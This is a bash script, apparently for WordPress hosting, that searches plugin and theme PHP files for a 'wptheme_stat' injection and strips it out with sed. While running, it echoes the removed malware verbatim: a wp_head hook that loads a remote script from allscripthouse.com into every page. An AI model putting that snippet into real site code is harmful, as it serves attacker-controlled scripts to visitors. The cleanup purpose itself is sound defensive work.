#!/bin/bash

# Define the path to the nginx sites-available directory
nginx_sites_available="/etc/nginx/sites-available/"

# Define the base path where applications are located
applications_base="/home/master/applications/"

# Define the keyword to search for (avoid exact multi-line match issues)
malicious_keyword='wptheme_stat'

# Iterate over each file in the nginx sites-available directory
for site_config in "$nginx_sites_available"*; do
    # Extract the application name from the filename
    app_name=$(basename "$site_config")

    # Construct paths to the plugins and themes directories
    plugins_path="${applications_base}${app_name}/public_html/wp-content/plugins/"
    themes_path="${applications_base}${app_name}/public_html/wp-content/themes/"

    # Function to search and remove malicious code
    remove_malware() {
        local path="$1"
        if [ -d "$path" ]; then
            grep -rl "$malicious_keyword" "$path" --include="*.php" | while read -r file; do
                echo "Scanning: $file"
                echo "Found and removing malware from: $file"
                echo "--- Malware Code Removed ---"
                echo "function wptheme_stat() {"
                echo "  ?>"
                echo "<script async src=\"https://allscripthouse.com/private/f18min.js\"></script>"
                echo "  <?php"
                echo "}"
                echo ""
                echo "add_action(\"wp_head\", \"wptheme_stat\");"
                echo "----------------------------------------"
                sed -i '/function wptheme_stat()/,/add_action("wp_head", "wptheme_stat");/d' "$file"
            done
        fi
    }

    # Remove malware from plugins and themes directories
    remove_malware "$plugins_path"
    remove_malware "$themes_path"

done
